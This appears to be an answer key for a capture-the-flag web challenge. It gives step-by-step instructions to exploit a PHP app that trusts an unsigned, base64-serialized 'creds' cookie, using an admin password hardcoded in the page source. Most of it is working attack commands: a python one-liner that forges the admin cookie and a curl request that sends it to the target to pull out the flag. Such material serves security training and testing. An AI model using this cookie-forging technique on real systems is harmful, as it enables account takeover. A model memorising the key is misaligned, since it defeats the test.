# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Broken auth via a client-trusted, unsigned serialized cookie. The
app stores identity as `base64(php_serialize(['username'=>..,'password'=>..]))`
in the `creds` cookie and never verifies its integrity — it just decodes,
unserializes, and trusts it. The admin password is hardcoded in the page source
as `kl!RtYuUUig664ds32AKA87`. You can forge the cookie directly; no login needed.

1. **Forge the serialized admin cookie** — a PHP-serialized array with
   `username=admin` and the hardcoded admin password, base64-encoded:

   ```
   COOKIE=$(python3 -c "import base64; print(base64.b64encode(b'a:2:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:23:\"kl!RtYuUUig664ds32AKA87\";}').decode())")
   ```

2. **Send it as the `creds` cookie** to the index page:

   ```
   curl -s "http://<target>/index.php" --cookie "creds=$COOKIE"
   ```

3. **Extract the flag** (`FLAG{...}`) from the "Congratulations" response and
   report it verbatim.
